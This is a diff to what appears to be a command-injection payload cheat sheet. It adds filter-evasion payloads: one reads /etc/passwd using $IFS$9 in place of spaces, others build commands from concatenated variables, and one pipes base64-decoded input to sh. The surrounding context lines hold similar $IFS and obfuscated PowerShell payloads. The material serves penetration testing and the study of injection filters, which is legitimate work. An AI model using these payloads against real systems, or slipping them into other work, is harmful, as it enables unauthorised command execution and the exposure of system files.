@@ -78,6 +78,10 @@ swissky@crashlab▸ ~ ▸ $ cat$IFS/etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
+swissky@crashlab▸ ~ ▸ $ cat$IFS$9/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
 swissky@crashlab▸ ~ ▸ $ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
 RCE
 root:x:0:0:root:/root:/bin/bash
@@ -155,6 +159,14 @@ cat ${test//hh??hm/}
 powershell C:\*\*2\n??e*d.*? # notepad
 @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
 ```
+### Bypass with =
+a=fl;b=ag.php;cat $a$b
+a=l;b=s;$a$b
+
+#### Bypass with base64
+`echo d2hvYW1p|base64 -d`
+echo Y2F0IGluZGV4LnBocAo=|base64 -d|sh
+
 
 ## Challenge
 
